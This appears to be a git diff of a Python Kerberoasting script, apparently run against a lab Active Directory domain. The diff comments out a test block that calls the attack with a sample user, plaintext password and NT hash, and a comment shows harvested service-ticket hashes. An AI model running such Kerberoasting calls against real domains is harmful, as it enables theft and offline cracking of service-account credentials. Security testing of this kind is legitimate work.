@@ -33,13 +33,13 @@ def kerberoast(username, domain, dc_ip, password='', nthash=None):
     return krbroasting.run()
 
 
-if __name__ == '__main__':
+#if __name__ == '__main__':
     #tgs_out = kerberoast(username='l.douglas', password='Football1', domain='contoso.local')
-    tgs_out = kerberoast(username='l.douglas', nthash="e3162fc537e66f4dc1287271cdbec59b", dc_ip="192.168.56.133", domain='contoso.local')
+    #tgs_out = kerberoast(username='l.douglas', nthash="e3162fc537e66f4dc1287271cdbec59b", dc_ip="192.168.56.133", domain='contoso.local')
 
     # Output is a list of dict in the following format, None if error:
     # [{'username':'svc_sql', 'spn':'MSSQL/DB01', 'tgs':'$krb5tgs$23$*svc_sql$...'}]
-    pprint(tgs_out)
+    #pprint(tgs_out)
 
     #if tgs_out is not None:
     #    for tgs in tgs_out:
